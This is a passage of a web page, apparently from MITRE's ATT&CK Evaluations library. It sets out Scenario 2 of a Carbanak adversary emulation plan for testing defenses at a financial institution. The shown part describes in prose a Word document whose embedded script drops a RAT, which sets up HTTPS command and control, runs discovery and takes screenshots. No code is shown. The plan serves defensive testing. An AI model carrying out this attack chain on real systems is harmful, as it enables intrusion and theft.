<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.787088244051">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.6.0">

    <!-- Primary Meta Tags -->
    <title>Scenario 2</title>
    <meta name="title" content="Scenario 2">
    <meta name="description" content="For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and...">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/carbanak/emulation_plan/scenario_2/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/carbanak/emulation_plan/scenario_2/">
    <meta property="og:title" content="Scenario 2">
    <meta property="og:description" content="For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and...">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/carbanak/emulation_plan/scenario_2/">
    <meta property="twitter:title" content="Scenario 2">
    <meta property="twitter:description" content="For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and...">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../favicon.png" rel="icon">
    <link href="../../../../resources/css/retype.css?v=3.6.0.787088244051" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.787088244051" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.787088244051" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.6.0.787088244051" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../" class="pr-4">
                                                ATT&â€‹CK Evaluations Library
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Enterprise
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/carbanak/" class="pr-4">
                                                Carbanak
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/carbanak/emulation_plan/" class="pr-4">
                                                Carbanak Adversary Emulation
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../enterprise/carbanak/emulation_plan/scenario_2/" class="pr-4">
                                                Scenario 2
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="scenario-2" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#scenario-2">#</doc-anchor-trigger>
        <span>Scenario 2</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div>In&nbsp;</div>
    <div><a href="../../categories/enterprise/">enterprise</a></div>
</div>

<doc-anchor-target id="preface">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#preface">#</doc-anchor-trigger>
        <span>Preface</span>
    </h2>
</doc-anchor-target>
<p>For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.</p>
<p>While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that has protective/preventative defense measures enabled. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.</p>
<p>This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found <a href="../../resources/placeholder_substitution/">here</a>.</p>
<hr>
<doc-anchor-target id="overview">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#overview">#</doc-anchor-trigger>
        <span>Overview</span>
    </h2>
</doc-anchor-target>
<ul>
<li>Emulation of Carbanak usage of tools such as Carbanak malware, Mimikatz, and PsExec.</li>
<li>Scenario begins after delivery of a reverse shell payload distributed via spearphishing</li>
<li>Targeted attack of a financial institution with the explicit goal of monetary theft</li>
<li>Split into distinct steps that can be run independently of other steps</li>
<li>Designed to assess protective/preventative defense measures</li>
</ul>
<doc-anchor-target id="contents">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#contents">#</doc-anchor-trigger>
        <span>Contents</span>
    </h2>
</doc-anchor-target>
<ul>
<li><doc-anchor-trigger to="#test-1-initial-access-with-embedded-vbe-in-word-document">Step 1 - Initial Access &amp; Collection</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#test-2-registry-shellcode-and-execution">Step 2 - Registry Shellcode and Discovery</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#3a---uac-bypass-and-credential-dumping-t1549002-t1003001">Step 3 - Credential Dumping</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#4a---lateral-movement-via-psexec--pass-the-hash-t1569002-t1550">Step 4 - Lateral Movement</doc-anchor-trigger></li>
<li><doc-anchor-trigger to="#test-5-credential-access">Step 5 - Credential Access</doc-anchor-trigger></li>
</ul>
<doc-anchor-target id="pre-requisites">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#pre-requisites">#</doc-anchor-trigger>
        <span>Pre-requisites</span>
    </h3>
</doc-anchor-target>
<p>Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the <a href="infrastructure/">Scenario 2 Infrastructure</a> documentation.</p>
<hr>
<doc-anchor-target id="test-1-initial-access-with-embedded-vbe-in-word-document">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#test-1-initial-access-with-embedded-vbe-in-word-document">#</doc-anchor-trigger>
        <span>Test 1: Initial Access with Embedded VBE in Word Document</span>
    </h2>
</doc-anchor-target>
<p>The scenario begins with an initial breach, where a legitimate user opens a Word document and
clicks on (<a href="https://attack.mitre.org/versions/v6/techniques/T1204/" class="outbound" target="_blank"><span>T1204</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> / <a href="https://attack.mitre.org/techniques/T1204/002/" class="outbound" target="_blank"><span>T1204.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) an embedded OLE object, causing an encoded (<a href="https://attack.mitre.org/techniques/T1027/" class="outbound" target="_blank"><span>T1027</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) Visual Basic script contained within the object to execute (<a href="https://attack.mitre.org/techniques/T1059/005/" class="outbound" target="_blank"><span>T1059.005</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>On execution, this script decodes (<a href="https://attack.mitre.org/techniques/T1140/" class="outbound" target="_blank"><span>T1140</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) and writes two files to disk, <code v-pre>starter.vbs</code> and <code v-pre>TransBaseOdbcDriver.js</code>. The script then executes <code v-pre>starter.vbs</code>, which in turn executes <code v-pre>TransBaseOdbcDriver.js</code> (<a href="https://attack.mitre.org/techniques/T1059/007/" class="outbound" target="_blank"><span>T1059.007</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). <code v-pre>TransBaseOdbcDriver.js</code> is a RAT that establishes encrypted (<a href="https://attack.mitre.org/techniques/T1563/002/" class="outbound" target="_blank"><span>T1563.002</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) command and control with the attacker over HTTP/S (TCP 443) (<a href="https://attack.mitre.org/techniques/T1071/001/" class="outbound" target="_blank"><span>T1071.001</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>).</p>
<p>The attacker then executes several discovery scripts that are part of the RAT, which gather information such as device hostname, username, domain (<a href="https://attack.mitre.org/techniques/T1033/" class="outbound" target="_blank"><span>T1033</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), CPU architecture (<a href="https://attack.mitre.org/techniques/T1082/" class="outbound" target="_blank"><span>T1082</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), and currently running processes (<a href="https://attack.mitre.org/techniques/T1057/" class="outbound" target="_blank"><span>T1057</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>). These scripts obtain this information by making WMI queries (<a href="https://attack.mitre.org/techniques/T1047/" class="outbound" target="_blank"><span>T1047</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) and querying ActiveX networking attributes.</p>
<p>Finally, the attacker uploads (<a href="https://attack.mitre.org/techniques/T1105/" class="outbound" target="_blank"><span>T1105</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>) and executes a PowerShell script (<a href="https://attack.mitre.org/techniques/T1059/001/" class="outbound" target="_blank"><span>T1086</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>), which takes a screenshot of the user&#x27;s desktop (<a href="https://attack.mitre.org/techniques/T1113/" class="outbound" target="_blank"><span>T1113</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" 